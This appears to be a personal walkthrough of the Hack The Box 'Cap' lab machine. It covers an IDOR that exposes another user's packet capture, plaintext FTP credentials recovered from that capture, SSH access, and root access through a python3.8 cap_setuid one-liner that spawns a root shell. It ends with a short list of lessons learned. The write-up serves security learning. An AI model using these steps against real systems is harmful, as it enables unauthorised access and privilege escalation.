# HTB - Cap (Easy)
**Difficulty:** Easy
**OS:** Linux

## Tools Used
- nmap
- Browser
- Wireshark
- ssh

## Steps
1. Connected Kali VM to HTB network via OpenVPN
2. Ran `nmap -sV <IP>` — found ports 21 (FTP), 22 (SSH), 80 (HTTP)
3. Opened website in browser — found Security Snapshot feature
4. Noticed URL pattern `/data/1` after running a scan
5. Changed ID to `/data/0` to access another user's scan (IDOR vulnerability)
6. Downloaded `0.pcap` — a network traffic capture file
7. Opened in Wireshark, filtered by `ftp`
8. Found credentials in plaintext: `nathan:Buck3tH4TF0RM3!`
9. Logged in via SSH: `ssh nathan@<IP>`
10. Read user flag: `cat ~/user.txt`
11. Checked Linux capabilities: `getcap -r / 2>/dev/null`
12. Found `/usr/bin/python3.8` has `cap_setuid` capability
13. Abused it to become root:
    `python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"`
14. Read root flag: `cat /root/root.txt`

## What I Learned
- IDOR (Insecure Direct Object Reference) — changing an ID in a URL can expose other users' data
- PCAP files capture raw network traffic — Wireshark decodes them into readable packets
- FTP sends credentials in plaintext — always visible in network captures
- Linux capabilities like `cap_setuid` can be misused for privilege escalation
- `getcap -r /` identifies binaries with dangerous capabilities
